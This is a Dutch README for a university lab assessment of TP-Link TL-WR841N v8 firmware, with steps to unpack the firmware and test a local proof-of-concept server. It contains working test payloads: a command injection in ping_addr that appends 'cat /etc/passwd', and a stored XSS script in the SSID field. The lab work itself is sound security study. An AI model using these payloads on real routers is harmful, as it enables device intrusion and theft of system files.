# TP-Link TL-WR841N Firmware Security Assessment

Dit project documenteert een security assessment van de **TP-Link TL-WR841N (v8)** firmware.  
De analyse is uitgevoerd in het kader van de **Novi University – Software Security leerlijn**.

---

## Overzicht

Tijdens dit onderzoek zijn firmwarebestanden gedownload, uitgepakt en geanalyseerd met zowel **statische** als **dynamische** methoden.  
Omdat de originele `httpd` binary beperkt draaide in emulatie, is een eigen **Python Proof-of-Concept server** (`upload_server.py`) opgezet om kwetsbaarheden te demonstreren.

**Geteste endpoints:**
1. `/userRpm/LoginRpm.htm` – Authenticatie  
2. `/userRpm/SoftwareUpgradeRpm.htm` – Firmware upload  
3. `/userRpm/BakNRestoreRpm.htm` – Config backup/restore  
4. `/userRpm/DiagnosticRpm.htm` – Ping/Traceroute  
5. `/userRpm/WlanAdvRpm.htm` – SSID configuratie  

---

## 🛠️ Voorbereiding

Firmware downloaden en uitpakken:

```bash
cd ~/iot/tplink_tlwr841n
wget https://static.tp-link.com/TL-WR841N(UN)_V8_170210.zip
unzip TL-WR841N(UN)_V8_170210.zip
cd TL-WR841N(UN)_V8_170210
binwalk -e --run-as=root wr841nv8_en_3_16_9_up_boot\(170210\).bin
tree -L 2 squashfs-root-fixed
```

## Proof-of-Concept server

De aangepaste PoC-server (upload_server.py) simuleert meerdere kwetsbare endpoints:

Config Restore Upload

Diagnostic Command Injection

WLAN SSID Stored XSS

Start de server:
```bash
python3 upload_server.py 8088
```

## Testcommando’s
1. Config Restore (BakNRestoreRpm)

Genereer een fake backup:
```bash
dd if=/dev/urandom of=backup.bin bs=1K count=1
```
Upload via PoC-server:
```bash
curl -i -X POST -F "config=@backup.bin" \
  http://127.0.0.1:8088/web/userRpm/BakNRestoreRpm.htm
```
DiagnosticRpm (Command Injection)

Kwetsbare parameter: ping_addr
```
curl -i -X POST -d "ping_addr=8.8.8.8; cat /etc/passwd" \
  http://127.0.0.1:8088/web/userRpm/DiagnosticRpm.htm
```
WLAN SSID (Stored XSS)
Injecteer payload:
```
curl -i -X POST -d "ssid=<script>alert('XSS')</script>" \
  http://127.0.0.1:8088/web/userRpm/WlanAdvRpm.htm
```
Controleer in browser dat de SSID terugkomt inclusief payload.

















